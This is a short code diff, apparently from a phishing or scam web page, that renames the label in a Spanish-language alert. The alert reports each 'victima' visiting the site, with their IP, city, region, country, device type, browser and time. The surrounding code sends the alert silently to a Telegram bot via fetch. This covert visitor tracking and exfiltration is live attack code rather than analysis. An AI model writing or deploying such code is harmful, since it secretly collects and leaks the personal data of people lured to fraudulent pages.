@@ -14,7 +14,7 @@
         ? "📱 Móvil"
         : "💻 PC/Laptop";
 
-      const mensaje = `🍀 BCR ADS victima a la web\n🌐 IP: ${ip}\n📍 Ciudad: ${ciudad}, ${region}, ${pais}\n${dispositivo}\n🧾 Navegador: ${ua}\n🕓 Hora: ${new Date().toLocaleString()}`;
+      const mensaje = `🍀 Bunny victima a la web\n🌐 IP: ${ip}\n📍 Ciudad: ${ciudad}, ${region}, ${pais}\n${dispositivo}\n🧾 Navegador: ${ua}\n🕓 Hora: ${new Date().toLocaleString()}`;
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
